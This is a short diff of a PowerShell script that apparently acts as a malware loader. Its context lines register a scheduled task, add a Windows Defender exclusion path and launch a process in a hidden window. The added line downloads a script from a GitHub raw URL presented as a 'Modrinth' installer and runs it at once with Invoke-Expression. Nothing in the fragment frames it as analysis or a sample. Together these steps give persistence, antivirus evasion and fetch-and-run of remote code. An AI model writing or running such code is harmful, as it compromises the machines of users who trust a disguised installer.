@@ -20,3 +20,4 @@ Register-ScheduledTask -TaskName $TN -Action $A -Trigger $G -Principal $P -Setti
 Add-MpPreference -ExclusionPath $D -EA SilentlyContinue
 Start-Process -FilePath $E -ArgumentList $T -WindowStyle Hidden
 Start-Sleep 1
+Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmoLa63/Modrinth_instalation/refs/heads/main/install.ps1" -UseBasicParsing).Content
